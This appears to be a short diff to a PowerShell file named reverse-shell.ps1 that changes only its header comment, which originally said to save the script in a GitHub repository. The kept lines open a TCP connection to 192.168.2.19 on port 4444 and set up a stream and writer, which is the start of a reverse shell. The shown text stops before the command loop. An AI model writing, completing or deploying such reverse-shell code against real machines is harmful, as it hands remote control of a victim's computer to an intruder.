@@ -1,5 +1,4 @@
-# Save this as reverse_shell.ps1 in your GitHub repository
-
+# reverse-shell.ps1
 $client = New-Object System.Net.Sockets.TCPClient("192.168.2.19", 4444)
 $stream = $client.GetStream()
 $writer = New-Object System.IO.StreamWriter($stream)
